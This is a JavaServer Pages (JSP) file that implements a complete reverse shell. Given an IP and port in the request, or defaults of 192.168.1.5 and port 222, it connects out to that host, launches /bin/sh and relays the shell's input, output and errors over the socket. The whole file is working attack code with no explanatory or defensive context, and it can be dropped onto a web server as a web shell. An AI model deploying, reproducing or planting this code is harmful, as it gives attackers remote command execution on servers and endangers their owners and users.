<%@ page import="java.io.*, java.net.*" %>
<%
    // Get IP and port from request parameters, with defaults
    String ip = request.getParameter("ip");
    if (ip == null || ip.isEmpty()) {
        ip = "192.168.1.5"; // default IP
    }

    int port = 222; // default port
    try {
        String portParam = request.getParameter("port");
        if (portParam != null) {
            port = Integer.parseInt(portParam);
            if (port < 1 || port > 65535) {
                out.println("Invalid port number.");
                return;
            }
        }
    } catch (NumberFormatException e) {
        out.println("Invalid port number.");
        return;
    }

    // Validate IP address format (basic check)
    if (!ip.matches("\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b")) {
        out.println("Invalid IP address.");
        return;
    }

    try {
        Socket socket = new Socket(ip, port);

        // Start shell process
        String shell = "/bin/sh";
        ProcessBuilder pb = new ProcessBuilder(shell);
        Process process = pb.start();

        InputStream processIn = process.getInputStream();
        InputStream processErr = process.getErrorStream();
        OutputStream processOut = process.getOutputStream();

        InputStream socketIn = socket.getInputStream();
        OutputStream socketOut = socket.getOutputStream();

        // Thread to forward data from socket to process input
        Thread t1 = new Thread(() -> {
            try {
                byte[] buffer = new byte[1024];
                int len;
                while ((len = socketIn.read(buffer)) != -1) {
                    processOut.write(buffer, 0, len);
                    processOut.flush();
                }
            } catch (IOException e) {
                // Ignore or log
            }
        });

        // Thread to forward data from process output to socket
        Thread t2 = new Thread(() -> {
            try {
                byte[] buffer = new byte[1024];
                int len;
                while ((len = processIn.read(buffer)) != -1) {
                    socketOut.write(buffer, 0, len);
                    socketOut.flush();
                }
            } catch (IOException e) {
                // Ignore or log
            }
        });

        // Thread to forward data from process error to socket
        Thread t3 = new Thread(() -> {
            try {
                byte[] buffer = new byte[1024];
                int len;
                while ((len = processErr.read(buffer)) != -1) {
                    socketOut.write(buffer, 0, len);
                    socketOut.flush();
                }
            } catch (IOException e) {
                // Ignore or log
            }
        });

        t1.start();
        t2.start();
        t3.start();

        // Wait for process to finish
        process.waitFor();

        // Close resources
        socket.close();
    } catch (Exception e) {
        out.println("Error: " + e.getMessage());
    }
%>